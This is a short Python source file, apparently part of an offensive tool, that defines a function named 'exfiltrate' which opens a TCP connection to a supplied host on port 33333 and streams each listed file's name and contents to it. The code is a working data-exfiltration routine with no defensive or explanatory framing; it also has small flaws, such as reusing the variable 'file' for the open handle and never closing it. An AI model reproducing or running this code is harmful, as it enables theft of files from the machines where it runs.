import socket

from time import sleep


def exfiltrate(host_ip, files, path):
    for file in files:
        sock = socket.socket()
        sock.connect((host_ip, 33333))
        sock.sendall(file.encode())
        sleep(1)
        
        file = open(file, "rb")
        data = file.read(1024)
        while data:
            sock.send(data)
            data = file.read(1024)
            
        print("[i] {} is empty".format(file))
        sock.close()
